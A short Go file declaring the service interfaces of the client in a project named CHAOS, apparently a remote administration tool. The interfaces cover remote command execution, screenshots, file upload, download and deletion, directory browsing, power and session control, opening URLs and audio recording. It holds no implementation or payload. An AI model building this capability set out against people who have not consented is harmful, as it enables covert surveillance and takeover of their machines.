package services

import (
	"errors"
	"time"

	"github.com/justadoll/CHAOS/client/app/entities"
)

var (
	ErrUnsupportedPlatform = errors.New("unsupported platform")
	ErrDeadlineExceeded    = errors.New("command deadline exceeded")
)

type Services struct {
	Information
	Terminal
	Screenshot
	Download
	Upload
	Delete
	Explorer
	OS
	URL
	Audio
}

type Information interface {
	LoadDeviceSpecs() (*entities.Device, error)
}

type Terminal interface {
	Run(cmd string, timeout time.Duration) string
}

type Screenshot interface {
	TakeScreenshot() ([]byte, error)
}

type Upload interface {
	UploadFile(path string) ([]byte, error)
}

type Delete interface {
	DeleteFile(filepath string) error
}

type Download interface {
	DownloadFile(filepath string) ([]byte, error)
}

type Explorer interface {
	ExploreDirectory(path string) (*entities.FileExplorer, error)
}

type OS interface {
	Restart() error
	Shutdown() error
	Lock() error
	SignOut() error
}

type URL interface {
	OpenURL(url string) error
}

type Audio interface {
	Record(raw_seconds string) ([]byte, error)
}
